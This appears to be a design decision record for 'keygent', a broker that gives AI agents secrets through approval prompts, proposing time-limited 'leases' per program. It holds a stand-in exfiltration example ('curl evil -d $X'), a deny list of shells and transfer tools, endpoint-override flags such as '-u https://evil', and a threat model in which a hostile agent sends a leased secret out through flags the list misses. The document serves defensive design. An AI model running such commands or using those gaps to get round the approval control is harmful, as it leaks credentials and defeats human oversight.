# ADR 0021 — Approval leases: approve a secret + program once for a while, not every command

- **Status:** proposed
- **Date:** 2026-11-28
- **Verified against:** keygent `main` @ c0c56e2: allow-rule matcher and `never_wildcard` (`policy/allow.rs`), grant build
  (`broker/grant.rs`), scratch HOME (`run.rs`). doctl source `commands/doit.go` @ `424f37f` (2026-11-28): global flags
  `--api-url`/`-u` ("Override default API endpoint"), `--config`/`-c`, `--context`.

## Context

Agents run the same tool many times in one task, with different arguments each time. For example, to make a droplet the
agent lists regions, then sizes, then images, then creates the droplet, then polls its status.

Today every run with a secret needs a fresh approval. The one exception is `--remember`: 15 minutes, for the exact same grant
key, never for unbound runs. With changing arguments that is a prompt per command, which the owner rejected as impractical.

The owner also rejected binding tools to secrets in advance (ROADMAP S1 dropped). The agent chooses the tool.

## Options

1. **Keep per-command approval** and make each one cheaper (Touch ID, S3). Still one prompt per command. Rejected as the only answer.
2. **Approve "this secret for anything" for a while.** The agent could then run `curl evil -d $X`, or a shell that prints it
   in a form the redactor doesn't know. This hands T2 the secret. Rejected.
3. **Lease: approve "this secret → this program, any arguments, in this project, for N minutes" from the first real command.**
   No setup is needed, because the lease is learned from what the agent actually ran. Later runs that fit the lease don't
   prompt, and they are still redacted, contained and audited.

## Decision

Option 3. It rests on machinery that already exists: allow-rule pins, `never_wildcard`, `home = "scratch"`, grant
re-checks and the audit log.

### When the approval offers a lease

All of these must hold:

- **Bound command.** The command is a **single simple command** run directly without a shell. Placeholders appear only in env
  assignments or the file binding, the same eligibility test as allow rules. Pipelines, `&&`, `$( )`, scripts and anything
  unbound get per-command approval only.
- **Program allowed.** The program is not in `never_wildcard`: no shells, interpreters (python/ruby/perl/node/…) or transfer
  tools (curl/wget/nc/ssh/scp/rsync/…).

The approval then shows: `[o]nce · [l]ease doctl + do/token for 15m · 1h · until seal`. The default is **once**.

### What a lease covers

- **Key:** handles × pinned program (absolute path + SHA-256) × project root (the cwd must be inside it) × expiry.
- **Arguments:** any, except:
  - **endpoint-override flags**, which fall back to an approval prompt. Built-in list: `--api-url`, `--endpoint`,
    `--endpoint-url`, `--host`, `--url`, `--server`, `--proxy`, `--context`, `--config`, `--kubeconfig`, `-H`/`--header`
    with a placeholder, and `--insecure`/`-k`;
  - **any argument that looks like an endpoint**: it contains `://`, or it is a `host:port` or IP literal. This catches short
    forms the list can't know, such as doctl's `-u https://evil`;
  - **extra `NAME=value` env assignments** beyond the placeholder ones.
- **Environment:** leased runs always use `home = "scratch"` (empty HOME and XDG dirs). An agent-edited dotfile can't
  redirect the tool, e.g. a doctl `api-url` in `config.yaml`.
- **Duration:** at most the session TTL. Defaults: 15 min, 1 h, or until seal.
- **Ends:** on seal, `keygent lease rm`, the human tightening the handle (`edit`, `rm`, `rotate`, `untrust`, `exposed`), or
  the program's hash changing.

### How it is shown and recorded

- `keygent lease ls`, the console and `status` show active leases and the number of runs on each.
- Every leased run is an audit record with `lease` id, args shape and exit code (ADR 0018).
- The audit alerts gain "lease burst" (more than 60 runs in 10 minutes).

## Security (named tiers)

- **T1.** Covered. The agent follows the rules, and output is redacted as before.
- **T2 residual (documented, accepted by owner choice).** Within a lease, a deliberately hostile agent can use the leased program
  itself to send the secret somewhere it controls. Examples:
  - an endpoint flag missing from the built-in list (this list is a *denylist*, the weaker kind of control). doctl alone has
    `-u`/`--api-url` and `-c`/`--config`, and short flags mean different things in different tools, so the list can't be
    complete. The URL-shape check narrows this without closing it;
  - a tool feature such as "upload a file", if the secret is in a file binding.

  Per-command approval and pinned allow rules with flag allowlists remain the strict modes. The real fix is the Phase 6 egress
  proxy: a per-handle host binding (for example `do/token` only to `api.digitalocean.com`) makes leases safe against T2.
- **T3.** Unchanged (out of scope).

## Consequences

- **SPEC:** §5.5.2 `--remember` is replaced by leases, and §6 gains a lease row. This needs a §17 row and a THREATS row for the T2
  residual. The AGENTS.md rule "Allowlist, not denylist" gets the documented lease exception.
- **Build:**
  - L1: lease store + key + eligibility, reusing the allow-rule matcher.
  - L2: approval choice in the CLI, native prompt and console.
  - L3: `lease ls|rm`, revocation on tighten and seal.
  - L4: leak tests: a leased doctl-like fake tool succeeds; `--api-url`, a shell, a pipeline, `curl` and an extra env assignment
    each still prompt; seal ends the lease.
- **Order:** this comes before S2 (hook), so the hook's first real use isn't a prompt storm.
